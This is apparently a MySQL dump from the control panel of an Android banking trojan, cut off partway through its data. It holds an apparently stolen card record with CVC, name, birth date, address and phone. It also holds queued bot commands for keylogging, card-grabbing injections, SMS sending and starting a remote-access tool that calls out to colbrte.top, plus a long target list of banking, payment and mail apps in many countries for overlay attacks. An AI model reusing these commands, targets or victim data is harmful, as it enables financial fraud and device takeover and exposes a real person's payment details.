-- MySQL dump 10.13  Distrib 5.7.25, for Linux (x86_64)
--
-- Host: localhost    Database: admin_db
-- ------------------------------------------------------
-- Server version	5.7.25-0ubuntu0.18.04.2

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;

--
-- Table structure for table `cc`
--

DROP TABLE IF EXISTS `cc`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `cc` (
  `id` int(255) unsigned NOT NULL AUTO_INCREMENT,
  `imei` varchar(20) NOT NULL,
  `country` varchar(10) NOT NULL,
  `typecard` varchar(20) DEFAULT NULL,
  `numbercard` varchar(30) NOT NULL,
  `monthyear` varchar(20) DEFAULT NULL,
  `cvc` varchar(20) DEFAULT NULL,
  `nameholder` varchar(50) DEFAULT NULL,
  `databirth` varchar(50) DEFAULT NULL,
  `postalcode` varchar(20) DEFAULT NULL,
  `addressholder` varchar(100) DEFAULT NULL,
  `phonenumber` varchar(50) DEFAULT NULL,
  `ssn` varchar(50) DEFAULT NULL,
  `accountnumber` varchar(50) DEFAULT NULL,
  `vbv` varchar(20) DEFAULT NULL,
  `SortCode` varchar(20) DEFAULT NULL,
  `timeaddcc` varchar(30) DEFAULT NULL,
  `comments` varchar(3000) DEFAULT NULL,
  `bin` varchar(500) DEFAULT NULL,
  `vbv2` varchar(30) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=4 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `cc`
--

LOCK TABLES `cc` WRITE;
/*!40000 ALTER TABLE `cc` DISABLE KEYS */;
INSERT INTO `cc` VALUES (3,'6142fb976a7bfe09','ru','mastercard','5168755108405891','7/21','972','Чернобай Артур ','02.06.1999','02156','Милютенка 6','0968645171',NULL,NULL,'6323','6323','',NULL,NULL,NULL);
/*!40000 ALTER TABLE `cc` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `commands`
--

DROP TABLE IF EXISTS `commands`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `commands` (
  `id` int(255) unsigned NOT NULL AUTO_INCREMENT,
  `IMEI` varchar(60) NOT NULL,
  `command` varchar(2000) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `id` (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=106 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `commands`
--

LOCK TABLES `commands` WRITE;
/*!40000 ALTER TABLE `commands` DISABLE KEYS */;
INSERT INTO `commands` VALUES (4,'6bfce2c63e4a15c8','|command=Send_GO_SMS|number=+380638715088|text=!!!::'),(20,'5e7cceae75e0e25d','getpermissions::'),(21,'21915940201bd81d','getpermissions::'),(22,'2ca96633256e3f54','getpermissions::'),(25,'5e7cceae75e0e25d','|startinj=grab1|endstartinj::'),(26,'21915940201bd81d','|startinj=grab1|endstartinj::'),(27,'2ca96633256e3f54','|startinj=grab1|endstartinj::'),(31,'564f4b69af0e490d','|startinj=grab1|endstartinj::'),(42,'5063ef55d5223dc3','getkeylogger::'),(44,'5e7cceae75e0e25d','getkeylogger::'),(45,'21915940201bd81d','getkeylogger::'),(46,'2ca96633256e3f54','getkeylogger::'),(48,'78881b9493a6310a','getkeylogger::'),(49,'b0ede5abd118003d','getkeylogger::'),(51,'352d1c92a2c8b82e','getkeylogger::'),(53,'564f4b69af0e490d','getkeylogger::'),(54,'352f1df6a2fa87e0','getkeylogger::'),(63,'8ed773d5b75c3fe5','GetSWSGO::'),(65,'6142fb976a7bfe09','nymBePsG0::'),(77,'ce8e18fa69782269','GetSWSGO::'),(99,'50cae5831bb8b877','|startrat=50cae5831bb8b877|endrat=http://colbrte.top|endurl::');
/*!40000 ALTER TABLE `commands` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `idbotwindows`
--

DROP TABLE IF EXISTS `idbotwindows`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `idbotwindows` (
  `id` int(255) NOT NULL AUTO_INCREMENT,
  `idbot` varchar(50) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `idbotwindows`
--

LOCK TABLES `idbotwindows` WRITE;
/*!40000 ALTER TABLE `idbotwindows` DISABLE KEYS */;
INSERT INTO `idbotwindows` VALUES (1,'111'),(2,'222');
/*!40000 ALTER TABLE `idbotwindows` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `injection`
--

DROP TABLE IF EXISTS `injection`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `injection` (
  `id` int(60) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(500) NOT NULL,
  `process` varchar(500) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=1165 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `injection`
--

LOCK TABLES `injection` WRITE;
/*!40000 ALTER TABLE `injection` DISABLE KEYS */;
INSERT INTO `injection` VALUES (1,'Info + Grabber cards','grab1,com.whatsapp,com.tencent.mm,com.ubercab,com.viber.voip,com.snapchat.android,com.instagram.android,com.imo.android.imoim,com.twitter.android'),(2,'Info + Grabber cards mini','grab3,com.whatsapp,com.tencent.mm,com.ubercab,com.viber.voip,com.snapchat.android,com.instagram.android,com.imo.android.imoim,com.twitter.android'),(3,'Grabber cards','grab2,com.whatsapp,com.tencent.mm,com.ubercab,com.viber.voip,com.snapchat.android,com.instagram.android,com.imo.android.imoim,com.twitter.android'),(4,'Grabber cards mini','grab4,com.whatsapp,com.tencent.mm,com.ubercab,com.viber.voip,com.snapchat.android,com.instagram.android,com.imo.android.imoim,com.twitter.android'),(8,'Grabber cards Facebook','grabfacebook,com.facebook.katana,com.facebook.orca'),(14,'Grabber Yahoo','yahoo,com.yahoo.mobile.client.android.mail'),(15,'Grabber Gmail','gmail,com.google.android.gm,com.google.android.apps.inbox'),(16,'Grabber mail.com','mails_com.mail.mobile.android.mail,com.mail.mobile.android.mail'),(17,'Grabber Connect for Hotmail','malis_com.connectivityapps.hotmail,com.connectivityapps.hotmail'),(20,'(RU)(Bank)Sberbank','ru_sberbank,ru.sberbankmobile'),(21,'(RU)(BANK)Tinkoff','ru_tinkoff,com.idamob.tinkoff.android'),(22,'(RU)(BANK)VTB24','ru_vtb24,ru.vtb24.mobilebanking.android'),(23,'(UA)(BANK)PrivateBank','ua_privatebank,ua.privatbank.ap24'),(200,'PayPal','paypal,com.paypal.android.p2pmobile'),(201,'Amazon','com.amazon.mShop.android.shopping,com.amazon.mShop.android.shopping'),(202,'Ebay','com.ebay.mobile,com.ebay.mobile'),(300,'(IT)com.jiffyondemand.user','it_com.jiffyondemand.user,com.jiffyondemand.user'),(301,'(IT)com.latuabancaperandroid','it_com.latuabancaperandroid,com.latuabancaperandroid'),(302,'(IT)com.latuabanca_tabperandroid','it_com.latuabanca_tabperandroid,com.latuabanca_tabperandroid'),(303,'(IT)com.lynxspa.bancopopolare','it_com.lynxspa.bancopopolare,com.lynxspa.bancopopolare'),(304,'(IT)com.unicredit','it_com.unicredit,com.unicredit'),(305,'(IT)it.bnl.apps.banking','it_it.bnl.apps.banking,it.bnl.apps.banking'),(306,'(IT)it.bnl.apps.enterprise.bnlpay','it_it.bnl.apps.enterprise.bnlpay,it.bnl.apps.enterprise.bnlpay'),(307,'(IT)it.bpc.proconl.mbplus','it_it.bpc.proconl.mbplus,it.bpc.proconl.mbplus'),(308,'(IT)it.copergmps.rt.pf.android.sp.bmps','it_it.copergmps.rt.pf.android.sp.bmps,it.copergmps.rt.pf.android.sp.bmps'),(309,'(IT)it.gruppocariparma.nowbanking','it_it.gruppocariparma.nowbanking,it.gruppocariparma.nowbanking'),(310,'(IT)it.ingdirect.app','it_it.ingdirect.app,it.ingdirect.app'),(311,'(IT)it.nogood.container','it_it.nogood.container,it.nogood.container'),(312,'(IT)it.popso.SCRIGNOapp','it_it.popso.SCRIGNOapp,it.popso.SCRIGNOapp'),(313,'(IT)posteitaliane.posteapp.apppostepay','it_posteitaliane.posteapp.apppostepay,posteitaliane.posteapp.apppostepay'),(340,'(CA)com.bmo.mobile','ca_com.bmo.mobile,com.bmo.mobile'),(341,'(CA)com.cibc.android.mobi','ca_com.cibc.android.mobi,com.cibc.android.mobi'),(342,'(CA)com.rbc.mobile.android','ca_com.rbc.mobile.android,com.rbc.mobile.android'),(343,'(CA)com.scotiabank.mobile','ca_com.scotiabank.mobile,com.scotiabank.mobile'),(344,'(CA)com.td','ca_com.td,com.td'),(370,'(US-UK-AU)com.citibank.mobile.au','au_citibank,com.citibank.mobile.au,com.citibank.mobile.uk,com.citi.citimobile'),(371,'(US)com.chase.sig.android','us_chase,com.chase.sig.android'),(372,'(US)com.infonow.bofa','us_bofa,com.infonow.bofa,com.bankofamerica.cashpromobile'),(373,'(US)com.konylabs.capitalone','us_capitalone,com.konylabs.capitalone,com.yinzcam.facilities.verizon'),(374,'(US)com.clairmail.fth','us_fifththirdbetter,com.clairmail.fth'),(375,'(US)com.moneybookers.skrillpayments','us_skrill,com.moneybookers.skrillpayments'),(376,'(US)com.moneybookers.skrillpayments.neteller','us_neteller,com.moneybookers.skrillpayments.neteller'),(377,'(US)com.suntrust.mobilebanking','us_suntrust,com.suntrust.mobilebanking'),(378,'(US)com.usaa.mobile.android.usaa','us_usaa,com.usaa.mobile.android.usaa'),(379,'(US)com.usbank.mobilebanking','us_usbank,com.usbank.mobilebanking'),(380,'(US)com.wf.wellsfargomobile','us_wellsfargomobile,com.wf.wellsfargomobile,com.wf.wellsfargomobile.tablet,com.wellsFargo.ceomobile'),(381,'(US)com.att.myWireless','us_com.att.myWireless,com.att.myWireless'),(382,'(US)com.vzw.hss.myverizon','us_com.vzw.hss.myverizon,com.vzw.hss.myverizon'),(400,'(ES)es.lacaixa.mobile.android.newwapicon','es_es.lacaixa.mobile.android.newwapicon,es.lacaixa.mobile.android.newwapicon'),(401,'(ES)es.evobanco.bancamovil','es_es.evobanco.bancamovil,es.evobanco.bancamovil'),(402,'(ES)es.bancopopular.nbmpopular','es_es.bancopopular.nbmpopular,es.bancopopular.nbmpopular'),(403,'(ES)com.tecnocom.cajalaboral','es_com.tecnocom.cajalaboral,com.tecnocom.cajalaboral'),(404,'(ES)com.rsi','es_com.rsi,com.rsi'),(405,'(ES)com.kutxabank.android','es_com.kutxabank.android,com.kutxabank.android'),(406,'(ES)com.bankinter.launcher','es_com.bankinter.launcher,com.bankinter.launcher'),(407,'(ES)com.bbva.netcash','es_bbvanetcash,com.bbva.netcash'),(408,'(ES)com.bbva.bbvacontigo','es_bbvacontigo,com.bbva.bbvacontigo,com.bbva.bbvawallet'),(409,'(ES)es.bancosantander.apps','es_bancosantander,es.bancosantander.apps,com.santander.app'),(410,'(ES)es.cm.android','es_bankia,es.cm.android,es.cm.android.tablet,com.bankia.wallet'),(431,'(UK)uk.co.bankofscotland.businessbank','uk_bankofscotland,uk.co.bankofscotland.businessbank,com.grppl.android.shell.BOS'),(432,'(UK)com.rbs.mobile.android.natwestoffshore','uk_natwest,com.rbs.mobile.android.natwestoffshore,com.rbs.mobile.android.natwest,com.rbs.mobile.android.natwestbandc'),(433,'(UK)com.rbs.mobile.investisir','uk_royalbankofscotland,com.rbs.mobile.investisir,com.phyder.engage,com.rbs.mobile.android.rbs,com.rbs.mobile.android.rbsbandc'),(434,'(UK-US)uk.co.santander.santanderUK','uk_santander,uk.co.santander.santanderUK,uk.co.santander.businessUK.bb,com.sovereign.santander'),(435,'(UK)com.ifs.banking.fiid4202','uk_tsb,com.ifs.banking.fiid4202,com.fi6122.godough'),(436,'(UK)com.rbs.mobile.android.ubr','uk_ulster,com.rbs.mobile.android.ubr'),(437,'(UK-US)com.htsu.hsbcpersonalbanking','uk_hsbc,com.htsu.hsbcpersonalbanking'),(438,'(UK)com.grppl.android.shell.halifax','uk_halifax,com.grppl.android.shell.halifax'),(439,'(UK)com.grppl.android.shell.CMBlloydsTSB73','uk_csgcsdnmb,com.grppl.android.shell.CMBlloydsTSB73'),(440,'(UK)com.barclays.android.barclaysmobilebanking','uk_barclays,com.barclays.android.barclaysmobilebanking'),(490,'(NL)com.ing.mobile','nl_ing.mobile,com.ing.mobile'),(491,'(NL)com.abnamro.nl.mobile.payments','nl_com.abnamro.nl.mobile.payments,com.abnamro.nl.mobile.payments'),(492,'(NL)com.triodos.bankingnl','nl_com.triodos.bankingnl,com.triodos.bankingnl'),(493,'(NL)nl.asnbank.asnbankieren','nl_nl.asnbank.asnbankieren,nl.asnbank.asnbankieren'),(494,'(NL)nl.snsbank.mobielbetalen','nl_nl.snsbank.mobielbetalen,nl.snsbank.mobielbetalen'),(513,'(IN)com.unionbank.ecommerce.mobile.android','in_unionbank.ecommerce.mobile.android,com.unionbank.ecommerce.mobile.android,com.unionbank.ecommerce.mobile.commercial.legacy'),(514,'(IN)com.snapwork.IDBI','in_src.com.idbi,com.snapwork.IDBI,src.com.idbi,com.idbi.mpassbook,com.idbibank.abhay_card'),(515,'(IN)com.snapwork.hdfc','in_snapwork.hdfc,com.snapwork.hdfc'),(516,'(IN)com.sbi.SBIFreedomPlus','in_sbi.SBFreedom,com.sbi.SBIFreedomPlus'),(517,'(IN)hdfcbank.hdfcquickbank','in_hdfcbank.hdfcquickbank,hdfcbank.hdfcquickbank'),(518,'(IN)com.csam.icici.bank.imobile','in_csam.icici.bank.imobile,com.csam.icici.bank.imobile'),(519,'(IN)in.co.bankofbaroda.mpassbook','in_co.bankofbaroda.mpassbook,in.co.bankofbaroda.mpassbook'),(520,'(IN)com.axis.mobile','in_axis,com.axis.mobile'),(521,'(IN)com.infrasofttech.indianBank','in_com.infrasofttech.indianBank,com.infrasofttech.indianBank'),(522,'(IN)com.mobikwik_new','in_com.mobikwik_new,com.mobikwik_new'),(523,'(IN)com.oxigen.oxigenwallet','in_com.oxigen.oxigenwallet,com.oxigen.oxigenwallet'),(565,'(CZ)eu.inmite.prj.kb.mobilbank','cz_eu.inmite.prj.kb.mobilbank,eu.inmite.prj.kb.mobilbank'),(566,'(CZ)cz.airbank.android','cz_cz.airbank.android,cz.airbank.android'),(567,'(CZ)sk.sporoapps.accounts','cz_sksporoapps,sk.sporoapps.accounts,sk.sporoapps.skener'),(568,'(CZ)cz.csob.smartbanking','cz_csobSmartbanking,cz.csob.smartbanking'),(569,'(CZ)cz.sberbankcz','cz_sberbankcz,cz.sberbankcz'),(570,'(CZ)com.cleverlance.csas.servis24','cz_cleverlanceCsasServis24,com.cleverlance.csas.servis24'),(602,'(AU)org.westpac.bank,nz.co.westpac','au_WestpacBank,org.westpac.bank,nz.co.westpac'),(603,'(AU)au.com.suncorp.SuncorpBank','au_SuncorpBank,au.com.suncorp.SuncorpBank'),(604,'(AU)org.stgeorge.bank','au_stgeorge.Bank,org.stgeorge.bank'),(605,'(AU)org.banksa.bank','au_orgBanksaBank,org.banksa.bank'),(607,'(AU)au.com.newcastlepermanent','au_newcastlepermanent,au.com.newcastlepermanent'),(608,'(AU)au.com.nab.mobile','au_nab,au.com.nab.mobile'),(609,'(AU)au.com.mebank.banking','au_mebank,au.com.mebank.banking'),(610,'(AU)au.com.ingdirect.android','au_ingdirect,au.com.ingdirect.android,MyING.be'),(611,'(AU)com.imb.banking2','au_imb.banking,com.imb.banking2'),(612,'(AU)com.fusion.ATMLocator','au_fusionATMLocator,com.fusion.ATMLocator'),(613,'(AU)au.com.cua.mb','au_cua,au.com.cua.mb'),(614,'(AU)com.commbank.netbank','au_commbank,com.commbank.netbank,com.cba.android.netbank'),(616,'(AU)org.bom.bank','au_bomBank,org.bom.bank'),(617,'(AU)com.bendigobank.mobile','au_bendigobank,com.bendigobank.mobile,me.doubledutch.hvdnz.cbnationalconference2016'),(618,'(AU)au.com.bankwest.mobile','au_bankwest,au.com.bankwest.mobile'),(619,'(AU)com.bankofqueensland.boq','au_bankofqueenslandBOQ,com.bankofqueensland.boq'),(620,'(AU)com.anz.android.gomoney','au_anzSingaporeDigitalBanking,com.anz.android.gomoney,com.anz.android,com.anz.SingaporeDigitalBanking,com.anzspot.mobile,com.crowdcompass.appSQ0QACAcYJ,com.arubanetworks.atmanz,com.quickmobile.anzirevents15'),(674,'(AT)com.bankaustria.android.olb','at_com.bankaustria.android.olb,com.bankaustria.android.olb'),(675,'(AT)at.spardat.netbanking','at_at.spardat.netbanking,at.spardat.netbanking'),(676,'(AT)at.spardat.bcrmobile','at_at.spardat.bcrmobile,at.spardat.bcrmobile'),(677,'(AT)at.volksbank.volksbankmobile','at_volksbank,at.volksbank.volksbankmobile,de.fiducia.smartphone.android.banking.vr,it.volksbank.android,it.secservizi.mobile.atime.bpaa,de.fiducia.smartphone.android.securego.vr'),(678,'(AT)com.isis_papyrus.raiffeisen_pay_eyewdg','at_raiffeisen,com.isis_papyrus.raiffeisen_pay_eyewdg'),(679,'(AT)at.easybank.mbanking','at_easybank,at.easybank.mbanking,at.easybank.tablet,at.easybank.securityapp'),(680,'(AT)at.bawag.mbanking','at_bawag,at.bawag.mbanking,com.bawagpsk.securityapp,at.psa.app.bawag'),(734,'(TR)com.akbank.android.apps.akbank_direkt','tr_akbank,com.akbank.android.apps.akbank_direkt,com.akbank.android.apps.akbank_direkt_tablet,com.akbank.softotp,com.mobilike.cepbutcem,akbank.yatirimci.mobile'),(735,'(TR)com.finansbank.mobile.cepsube','tr_qnb_finansbank,com.finansbank.mobile.cepsube,finansbank.enpara,com.magiclick.FinansPOS,com.matriksdata.finansyatirim,finansbank.enpara.sirketim,com.vipera.ts.starter.QNB,com.QNBAlAhli,com.qnbbank.mobile'),(736,'(TR)com.garanti.cepsubesi','tr_garantibank,com.garanti.cepsubesi,com.garanti.cepbank,com.garantibank.cepsubesiro,biz.mobinex.android.apps.cep_sifrematik,com.garantiemeklilik.cepsube,garanti.etrader'),(737,'(TR)com.tmobtech.halkbank','tr_halkbank,com.tmobtech.halkbank,com.SifrebazCep,eu.newfrontier.iBanking.mobile.Halk.Retail,rs.telnet.cacanskabankadroid,halkcorporate.mk'),(738,'(TR)com.softtech.isbankasi','tr_isbank,com.softtech.isbankasi,com.yurtdisi.iscep,com.softtech.iscek,com.monitise.isbankmoscow'),(739,'(TR)com.ykb.android','tr_yapikredi,com.ykb.android,com.ykb.android.mobilonay,com.ykb.avm,com.ykb.androidtablet,com.veripark.ykbaz'),(740,'(TR)com.ziraat.ziraatmobil','tr_ziraatbanksi,com.ziraat.ziraatmobil,com.ziraat.ziraattablet,com.matriksmobile.android.ziraatTrader'),(741,'(TR)com.pozitron.iscep','tr_pozitron.iscep,com.pozitron.iscep'),(742,'(TR)com.vakifbank.mobile','tr_vakifbank,com.vakifbank.mobile,com.pozitron.vakifbank'),(743,'(TR)com.btcturk','tr_com.btcturk,com.btcturk'),(744,'(TR)com.finansbank.mobile.cepsube','tr_com.finansbank.mobile.cepsube,com.finansbank.mobile.cepsube'),(745,'(TR)com.ingbanktr.ingmobil','tr_com.ingbanktr.ingmobil,com.ingbanktr.ingmobil'),(746,'(TR)com.kuveytturk.mobil','tr_com.kuveytturk.mobil,com.kuveytturk.mobil'),(747,'(TR)com.magiclick.odeabank','tr_com.magiclick.odeabank,com.magiclick.odeabank'),(748,'(TR)com.mobillium.papara','tr_com.mobillium.papara,com.mobillium.papara'),(749,'(TR)com.pozitron.albarakaturk','tr_com.pozitron.albarakaturk,com.pozitron.albarakaturk'),(750,'(TR)com.teb','tr_com.teb,com.teb'),(751,'(TR)com.tmob.denizbank','tr_com.tmob.denizbank,com.tmob.denizbank'),(753,'(TR)finansbank.enpara','tr_finansbank.enpara,finansbank.enpara'),(754,'(TR)tr.com.hsbc.hsbcturkey','tr_tr.com.hsbc.hsbcturkey,tr.com.hsbc.hsbcturkey'),(755,'(TR)tr.com.sekerbilisim.mbank','tr_tr.com.sekerbilisim.mbank,tr.com.sekerbilisim.mbank'),(790,'(DE)com.starfinanz.smob.android.sfinanzstatus','de_spadrat,com.starfinanz.smob.android.sfinanzstatus,com.starfinanz.mobile.android.pushtan,com.entersekt.authapp.sparkasse,com.starfinanz.smob.android.sfinanzstatus.tablet'),(791,'(DE)de.comdirect.android','de_Comdirect,de.comdirect.android'),(792,'(DE)de.commerzbanking.mobil','de_CommerzBank,de.commerzbanking.mobil'),(793,'(DE)de.consorsbank','de_Consorsbank,de.consorsbank'),(794,'(DE)com.db.mm.deutschebank','de_DeutscheBank,com.db.mm.deutschebank'),(795,'(DE)de.dkb.portalapp','de_DKB,de.dkb.portalapp,com.de.dkb.portalapp'),(796,'(DE)com.ing.diba.mbbr2','de_ING_DiBa,com.ing.diba.mbbr2'),(797,'(DE)de.postbank.finanzassistent','de_Postbank,de.postbank.finanzassistent'),(798,'(DE)mobile.santander.de','de_Santander,mobile.santander.de'),(799,'(DE)com.starfinanz.smob.android.sbanking','de_Sparkasse,com.starfinanz.smob.android.sbanking'),(800,'(DE)de.fiducia.smartphone.android.banking.vr','de_Volksbank,de.fiducia.smartphone.android.banking.vr'),(801,'(DE)com.db.mm.norisbank','de_com.db.mm.norisbank,com.db.mm.norisbank'),(802,'(DE)com.db.pwcc.dbmobile','de_com.db.pwcc.dbmobile,com.db.pwcc.dbmobile'),(803,'(DE)com.targo_prod.bad','de_com.targo_prod.bad,com.targo_prod.bad'),(804,'(DE)eu.unicreditgroup.hvbapptan','de_eu.unicreditgroup.hvbapptan,eu.unicreditgroup.hvbapptan'),(870,'(FR)com.palatine.android.mobilebanking.prod','fr_palatine,com.palatine.android.mobilebanking.prod'),(871,'(FR)fr.laposte.lapostemobile','fr_laposte,fr.laposte.lapostemobile,fr.laposte.lapostetablet'),(872,'(FR)com.cm_prod.bad','fr_cmprodfr,com.cm_prod.bad,com.cm_prod.epasal,com.cm_prod_tablet.bad,com.cm_prod.nosactus'),(873,'(FR)fr.creditagricole.androidapp','fr_agricole,fr.creditagricole.androidapp'),(874,'(FR)fr.axa.monaxa','fr_axa,fr.axa.monaxa'),(875,'(FR)fr.banquepopulaire.cyberplus','fr_BanquePopulaire,fr.banquepopulaire.cyberplus'),(876,'(FR)net.bnpparibas.mescomptes','fr_BNPParibas,net.bnpparibas.mescomptes'),(877,'(FR)com.boursorama.android.clients','fr_Boursorama,com.boursorama.android.clients'),(878,'(FR)com.caisseepargne.android.mobilebanking','fr_CaisseEpargne,com.caisseepargne.android.mobilebanking'),(879,'(FR)fr.lcl.android.customerarea','fr_LCL,fr.lcl.android.customerarea'),(880,'(FR)mobi.societegenerale.mobile.lappli','fr_SocieteGenerale,mobi.societegenerale.mobile.lappli'),(1010,'(HK)com.bochk.com','hk_com.bochk.com,com.bochk.com'),(1011,'(HK)com.dbs.hk.dbsmbanking','hk_com.dbs.hk.dbsmbanking,com.dbs.hk.dbsmbanking'),(1012,'(HK)com.FubonMobileClient','hk_com.FubonMobileClient,com.FubonMobileClient'),(1013,'(HK)com.FubonMobileClient','hk_com.hangseng.rbmobile,com.hangseng.rbmobile'),(1014,'(HK)com.MobileTreeApp','hk_com.MobileTreeApp,com.MobileTreeApp'),(1015,'(HK)com.mtel.androidbea','hk_com.mtel.androidbea,com.mtel.androidbea'),(1016,'(HK)com.mtel.androidbea','hk_com.scb.breezebanking.hk,com.scb.breezebanking.hk'),(1017,'(HK)hk.com.hsbc.hsbchkmobilebanking','hk_hk.com.hsbc.hsbchkmobilebanking,hk.com.hsbc.hsbchkmobilebanking'),(1025,'(HU)com.aff.otpdirekt','hu_com.aff.otpdirekt,com.aff.otpdirekt'),(1035,'(IL)com.ideomobile.hapoalim','il_com.ideomobile.hapoalim,com.ideomobile.hapoalim'),(1045,'(JP)jp.co.aeonbank.android.passbook','jp_jp.co.aeonbank.android.passbook,jp.co.aeonbank.android.passbook'),(1046,'(JP)jp.co.netbk','jp_jp.co.netbk,jp.co.netbk'),(1047,'(JP)jp.co.rakuten_bank.rakutenbank','jp_jp.co.rakuten_bank.rakutenbank,jp.co.rakuten_bank.rakutenbank'),(1048,'(JP)jp.co.sevenbank.AppPassbook','jp_jp.co.sevenbank.AppPassbook,jp.co.sevenbank.AppPassbook'),(1049,'(JP)jp.co.smbc.direct','jp_jp.co.smbc.direct,jp.co.smbc.direct'),(1050,'(JP)jp.mufg.bk.applisp.app','jp_jp.mufg.bk.applisp.app,jp.mufg.bk.applisp.app'),(1060,'(KE)com.barclays.ke.mobile.android.ui','ke_com.barclays.ke.mobile.android.ui,com.barclays.ke.mobile.android.ui'),(1070,'(NZ)nz.co.anz.android.mobilebanking','nz_nz.co.anz.android.mobilebanking,nz.co.anz.android.mobilebanking'),(1071,'(NZ)nz.co.asb.asbmobile','nz_nz.co.asb.asbmobile,nz.co.asb.asbmobile'),(1072,'(NZ)nz.co.bnz.droidbanking','nz_nz.co.bnz.droidbanking,nz.co.bnz.droidbanking'),(1073,'(NZ)nz.co.kiwibank.mobile','nz_nz.co.kiwibank.mobile,nz.co.kiwibank.mobile'),(1085,'(PL)com.getingroup.mobilebanking','pl_com.getingroup.mobilebanking,com.getingroup.mobilebanking'),(1086,'(PL)eu.eleader.mobilebanking.pekao.firm','pl_eu.eleader.mobilebanking.pekao.firm,eu.eleader.mobilebanking.pekao.firm'),(1087,'(PL)eu.eleader.mobilebanking.pekao','pl_eu.eleader.mobilebanking.pekao,eu.eleader.mobilebanking.pekao'),(1088,'(PL)eu.eleader.mobilebanking.raiffeisen','pl_eu.eleader.mobilebanking.raiffeisen,eu.eleader.mobilebanking.raiffeisen'),(1089,'(PL)pl.bzwbk.bzwbk24','pl_pl.bzwbk.bzwbk24,pl.bzwbk.bzwbk24'),(1090,'(PL)pl.ipko.mobile','pl_pl.ipko.mobile,pl.ipko.mobile'),(1091,'(PL)pl.mbank','pl_pl.mbank,pl.mbank'),(1092,'(PL)alior.bankingapp.android','pl_alior.bankingapp.android,alior.bankingapp.android'),(1093,'(PL)com.comarch.mobile.banking.bgzbnpparibas.biznes','pl_com.comarch.mobile.banking.bgzbnpparibas.biznes,com.comarch.mobile.banking.bgzbnpparibas.biznes'),(1094,'(PL)com.comarch.security.mobilebanking','pl_com.comarch.security.mobilebanking,com.comarch.security.mobilebanking'),(1095,'(PL)com.empik.empikapp','pl_com.empik.empikapp,com.empik.empikapp'),(1096,'(PL)com.empik.empikfoto','pl_com.empik.empikfoto,com.empik.empikfoto'),(1097,'(PL)com.finanteq.finance.ca','pl_com.finanteq.finance.ca,com.finanteq.finance.ca'),(1098,'(PL)com.orangefinanse','pl_com.orangefinanse,com.orangefinanse'),(1099,'(PL)eu.eleader.mobilebanking.invest','pl_eu.eleader.mobilebanking.invest,eu.eleader.mobilebanking.invest'),(1100,'(PL)pl.aliorbank.aib','pl_pl.aliorbank.aib,pl.aliorbank.aib'),(1101,'(PL)pl.allegro','pl_pl.allegro,pl.allegro'),(1102,'(PL)pl.bosbank.mobile','pl_pl.bosbank.mobile,pl.bosbank.mobile'),(1103,'(PL)pl.bph','pl_pl.bph,pl.bph'),(1104,'(PL)pl.bps.bankowoscmobilna','pl_pl.bps.bankowoscmobilna,pl.bps.bankowoscmobilna'),(1105,'(PL)pl.bzwbk.ibiznes24','pl_pl.bzwbk.ibiznes24,pl.bzwbk.ibiznes24'),(1106,'(PL)pl.bzwbk.mobile.tab.bzwbk24','pl_pl.bzwbk.mobile.tab.bzwbk24,pl.bzwbk.mobile.tab.bzwbk24'),(1107,'(PL)pl.ceneo','pl_pl.ceneo,pl.ceneo'),(1108,'(PL)pl.com.rossmann.centauros','pl_pl.com.rossmann.centauros,pl.com.rossmann.centauros'),(1109,'(PL)pl.fmbank.smart','pl_pl.fmbank.smart,pl.fmbank.smart'),(1110,'(PL)pl.ideabank.mobilebanking','pl_pl.ideabank.mobilebanking,pl.ideabank.mobilebanking'),(1111,'(PL)pl.ing.mojeing','pl_pl.ing.mojeing,pl.ing.mojeing'),(1112,'(PL)pl.millennium.corpApp','pl_pl.millennium.corpApp,pl.millennium.corpApp'),(1113,'(PL)pl.orange.mojeorange','pl_pl.orange.mojeorange,pl.orange.mojeorange'),(1114,'(PL)pl.pkobp.iko','pl_pl.pkobp.iko,pl.pkobp.iko'),(1115,'(PL)pl.pkobp.ipkobiznes','pl_pl.pkobp.ipkobiznes,pl.pkobp.ipkobiznes'),(1116,'(PL)wit.android.bcpBankingApp.millenniumPL','pl_wit.android.bcpBankingApp.millenniumPL,wit.android.bcpBankingApp.millenniumPL'),(1145,'(RO)com.advantage.RaiffeisenBank','ro_com.advantage.RaiffeisenBank,com.advantage.RaiffeisenBank'),(1146,